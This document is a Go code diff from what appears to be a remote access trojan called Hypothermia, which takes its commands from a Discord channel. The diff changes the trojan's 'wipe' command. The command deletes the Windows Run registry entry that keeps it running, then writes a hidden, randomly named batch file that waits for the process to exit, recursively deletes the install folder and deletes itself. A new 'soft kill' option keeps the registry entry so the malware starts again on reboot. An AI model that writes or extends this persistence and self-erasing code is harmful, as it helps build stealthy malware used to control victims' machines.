@@ -2,6 +2,7 @@ package commands
 
 import (
 	"fmt"
+	"math/rand"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -20,20 +21,29 @@ const (
 	wipePathError   string = "🟥 Failed to get the path."
 	wipeDelError    string = "🟥 Failed to delete hypothermia."
 	wipeKillError   string = "🟥 Failed to kill hypothermia."
+
+	wipeSoftKill string = "🟩 Hypothermia soft killed, will startup on device reset."
 )
 
 type WipeCommand struct{}
 
 func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error {
-	if !config.Debugging {
+	var kill bool = false
+	if len(args) == 1 {
+		kill = true
+		s.ChannelMessageSendReply(m.ChannelID, wipeSoftKill, m.Reference())
+	}
+
+	if !config.Debugging && !kill {
+		checked := false
 		_, err := utils.GetRegistry(
 			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
 			config.HypothermiaName,
 		)
 
 		if err != nil {
-			_, err := s.ChannelMessageSendReply(m.ChannelID, wipeRegError, m.Reference())
-			return err
+			checked = true
+			s.ChannelMessageSendReply(m.ChannelID, wipeRegError, m.Reference())
 		}
 
 		err = utils.DelRegistry(
@@ -41,7 +51,7 @@ func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 			config.HypothermiaName,
 		)
 
-		if err != nil {
+		if err != nil && !checked {
 			_, err := s.ChannelMessageSendReply(m.ChannelID, wipeDeReglError, m.Reference())
 			return err
 		}
@@ -56,26 +66,30 @@ func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 	path, _ = filepath.Abs(path)
 	dir := filepath.Dir(path)
 
-	script := filepath.Join(os.TempDir(), "wowza.bat")
+	script := filepath.Join(os.TempDir(), fmt.Sprint(rand.Float32())+"wowza.bat")
 	utils.HideItem(script)
 
 	content := fmt.Sprintf(
 		"@echo off\n"+
 			":check\n"+
-			"tasklist | find \"Hypothermia.exe\" >nul\n"+
+			"tasklist | find \"%s\" >nul\n"+
 			"if not errorlevel 1 (\n"+
 			"  timeout /t 1 >nul\n"+
 			"  goto :check\n"+
 			")\n"+
-			"timeout /t 2 >nul\n"+
-			"rmdir /s /q \"%s\"\n"+
-			"del \"%%~f0\"\n",
-		dir,
+			"timeout /t 2 >nul\n",
+		filepath.Base(path),
 	)
+
+	if !kill {
+		content += fmt.Sprintf("rmdir /s /q \"%s\"\n", dir)
+	}
+
+	content += "del \"%%~f0\"\n"
 
 	err = os.WriteFile(script, []byte(content), 0644)
 	if err != nil {
-		_, err := s.ChannelMessageSendReply(m.ChannelID, wipeDelError, m.Reference())
+		_, err := s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(wipeDelError, err), m.Reference())
 		return err
 	}
 
@@ -86,7 +100,7 @@ func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 
 	err = cmd.Start()
 	if err != nil {
-		_, err := s.ChannelMessageSendReply(m.ChannelID, wipeDelError, m.Reference())
+		_, err := s.ChannelMessageSendReply(m.ChannelID, wipeKillError, m.Reference())
 		return err
 	}
 
